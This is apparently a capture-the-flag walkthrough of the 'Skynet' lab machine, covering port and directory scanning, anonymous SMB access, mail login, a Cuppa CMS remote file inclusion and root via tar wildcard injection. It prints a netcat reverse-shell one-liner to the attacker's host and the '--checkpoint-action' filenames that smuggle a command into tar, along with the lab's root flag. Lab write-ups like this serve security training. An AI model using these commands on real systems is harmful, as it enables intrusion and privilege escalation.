# Skynet (Easy)

![Untitled](https://github.com/user-attachments/assets/03d0d3b0-cf67-48b5-9311-e4cde3504c07)

# 1. Gather Information

- User `nmap` and `Gobuster` to scan port and directories:

```bash
nmap -sV -vv -A 10.10.11.127
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKeTyrvAfbRB4onlz23fmgH5DPnSz07voOYaVMKPx5bT62zn7eZzecIVvfp5LBCetcOyiw2Yhocs0oO1/RZSqXlwTVzRNKzznG4WTPtkvD7ws/4tv2cAGy1lzRy9b+361HHIXT8GNteq2mU+boz3kdZiiZHIml4oSGhI+/+IuSMl5clB5/FzKJ+mfmu4MRS8iahHlTciFlCpmQvoQFTA5s2PyzDHM6XjDYH1N3Euhk4xz44Xpo1hUZnu+P975/GadIkhr/Y0N5Sev+Kgso241/v0GQ2lKrYz3RPgmNv93AIQ4t3i3P6qDnta/06bfYDSEEJXaON+A9SCpk2YSrj4A7
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0UWS0x1ZsOGo510tgfVbNVhdE5LkzA4SWDW/5UjDumVQ7zIyWdstNAm+lkpZ23Iz3t8joaLcfs8nYCpMGa/xk=
|   256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICHVctcvlD2YZ4mLdmUlSwY8Ro0hCDMKGqZ2+DuI0KFQ
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: Skynet
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3        syn-ack ttl 63 Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE UIDL PIPELINING SASL RESP-CODES CAPA TOP
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        syn-ack ttl 63 Dovecot imapd
|_imap-capabilities: IDLE Pre-login LOGIN-REFERRALS more have post-login OK ID capabilities listed LOGINDISABLEDA0001 LITERAL+ ENABLE SASL-IR IMAP4rev1
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   SKYNET<00>           Flags: <unique><active>
|   SKYNET<03>           Flags: <unique><active>
|   SKYNET<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 33788/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 49416/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 19302/udp): CLEAN (Failed to receive data)
|   Check 4 (port 45766/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 0s
| smb2-time: 
|   date: 2024-06-11T17:16:00
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2024-06-11T12:16:00-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

```bash
gobuster dir -u http://10.10.11.127 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.127
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 312] [--> http://10.10.11.127/admin/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.127/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.127/js/]
/config               (Status: 301) [Size: 313] [--> http://10.10.11.127/config/]
/ai                   (Status: 301) [Size: 309] [--> http://10.10.11.127/ai/]
/squirrelmail         (Status: 301) [Size: 319] [--> http://10.10.11.127/squirrelmail/]
/server-status        (Status: 403) [Size: 277]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================

```

- After scan with Gobuster, all page is blocked by admin so we go to `/squirrelmail` and still go in.

![Untitled 1](https://github.com/user-attachments/assets/49f64614-dca8-4408-8a65-b18b657b0350)

- Now we need to find the credentials.
- First we try default credentials admin/admin —> Fail.
- Before we scan `smb` service with `enum4linux` :

```bash
enum4linux -a 10.10.250.72
[+] Attempting to map shares on 10.10.250.72

//10.10.250.72/print$	Mapping: DENIED Listing: N/A Writing: N/A
//10.10.250.72/anonymous	Mapping: OK Listing: OK Writing: N/A
//10.10.250.72/milesdyson	Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//10.10.250.72/IPC$	Mapping: N/A Listing: N/A Writing: N/A
```

- We use `smbclient` try to login to credential anonymous.

```bash
smbclient //10.10.250.72/anonymous
Password for [WORKGROUP\zicco]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 23:04:00 2020
  ..                                  D        0  Tue Sep 17 14:20:17 2019
  attention.txt                       N      163  Wed Sep 18 10:04:59 2019
  logs                                D        0  Wed Sep 18 11:42:16 2019

		9204224 blocks of size 1024. 5831528 blocks available
smb: \>
```

- We know the user is milesdyson and now we find the password by smbclient.
- 
![Untitled 2](https://github.com/user-attachments/assets/6ee925a4-3165-4b0d-86b7-5690c5ddaa93)

- We have the list password in log1.txt and we try each password to find the right password

—> Password: cyborg007haloterminator

- Back to the `/squirrelmail` to login again:

![Untitled 3](https://github.com/user-attachments/assets/bbed55f9-94e5-4bc3-884f-8158dfbfe320)

- Now we see the mail skynet with title “Samba Password Reset” —> This is the Password smb of account milesdyson.

![Untitled 4](https://github.com/user-attachments/assets/6d90880c-e4cb-4334-8803-d95a920fbb3a)

- Back to login smbclient with the credential milesdyson

```bash
smbclient -U milesdyson //10.10.250.72/milesdyson
Password for [WORKGROUP\milesdyson]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Sep 17 16:05:47 2019
  ..                                  D        0  Wed Sep 18 10:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 16:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 16:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 16:05:14 2019
  notes                               D        0  Tue Sep 17 16:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 16:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 16:05:14 2019

		9204224 blocks of size 1024. 5831488 blocks available
smb: \> 
```

```bash
smb: \> cd notes
smb: \> more important.txt
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
~
~
~
~
~
~
~
~
(END)
```

—> we find the hidden directory: /45kra24zxs28v3yd

- Go to /45kra24zxs28v3yd

![Untitled 5](https://github.com/user-attachments/assets/b6aee52b-0fb8-44e5-9c00-96fddaaa90ec)

- Still nothing so we have to scan the new directory with `gobuster`

```bash
gobuster dir -u http://10.10.250.72/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.250.72/45kra24zxs28v3yd/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/administrator        (Status: 301) [Size: 337] [--> http://10.10.250.72/45kra24zxs28v3yd/administrator/]
```

—> go to `/administrator`

![Untitled 6](https://github.com/user-attachments/assets/7d4b93f7-c9b8-48aa-a462-8e40b50e37c2)

—> We have the page Cuppa CMS and we do not know the credentials.

- Try search vuln in ExpoitDatabase to see if they have the vuln of the page Cuppa CMS.

![Untitled 7](https://github.com/user-attachments/assets/268cb927-2b72-4675-ba01-d8c1f54f0d03)

—> The vuln of the page: RFI (Remote File Inclusion)

- We exploit it by “/alertConfigField.php”.
- Read the Vuln and exploit it
- Before exploit we need to prepare the reverse shell to capture the listener. We can use the available reverse shell php in directory `/usr/share/webshells/php/**php-reverse-shell.php` .**

![Untitled 8](https://github.com/user-attachments/assets/2580cfe7-a383-48e3-b1c9-b711927da73e)

```bash
$ cd /home/milesdyson
$ ls
backups
mail
share
user.txt
$ cd backups
$ ls
backup.sh
backup.tgz
$ ls -l
total 4576
-rwxr-xr-x 1 root root      74 Sep 17  2019 backup.sh
-rw-r--r-- 1 root root 4679680 Jun 18 03:32 backup.tgz
$ ./backup.sh
tar: /home/milesdyson/backups/backup.tgz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
```

- We can manipulate the file root to privilege escalation.
- Check the file backup.sh

```bash
$ cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

- We see the another shell and the directory of file .sh —> we have the vuln Wildcard injection `tar*`
- The information about the Vuln Wildcard  : https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/

```bash
$ cd /var/www/html
$ ls
45kra24zxs28v3yd
admin
ai
config
css
image.png
index.html
js
style.css
```

```bash
	$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <our-ip> <our-port> > /tmp/f" > shell.sh
	$ chmod 777 shell.sh
	$ echo "/var/www/html" > "--checkpoint-action=exec=sh shell.sh
	$ echo "var/www/html" > --checkpoint=1
```

```bash
$ ls -l
total 72
-rw-rw-rw- 1 www-data www-data    14 Jun 18 04:54 --checkpoint-action=exec=sh shell.sh
-rw-rw-rw- 1 www-data www-data    14 Jun 18 04:54 --checkpoint=1
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rwxrwxrwx 1 www-data www-data    81 Jun 18 04:53 shell.sh
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
```

- We run netcat and automate capture the listener:

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.75.150] from (UNKNOWN) [10.10.250.72] 60552
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cd /root/
# ls
root.txt
# cat root.txt
3f0372db24753accc7179a282cd6a949
```

—> We got the Root.
